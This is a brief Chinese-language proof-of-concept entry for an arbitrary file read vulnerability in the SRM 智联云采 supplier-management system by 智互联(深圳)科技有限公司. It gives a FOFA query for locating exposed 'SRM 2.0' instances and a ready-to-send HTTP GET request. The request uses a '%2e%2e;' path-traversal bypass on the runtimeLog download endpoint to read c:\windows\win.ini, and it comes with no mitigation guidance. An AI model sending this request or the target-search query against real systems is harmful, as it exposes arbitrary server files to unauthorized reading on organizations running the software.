# 智互联(深圳)科技有限公司SRM智联云采系统download存在任意文件读取漏洞

智互联(深圳)科技有限公司SRM智联云采系统download存在任意文件读取漏洞

## fofa

```yaml
title=="SRM 2.0"
```

## poc

```java
GET /adpweb/static/%2e%2e;/a/sys/runtimeLog/download?path=c:\\windows\win.ini HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408162052746.png)
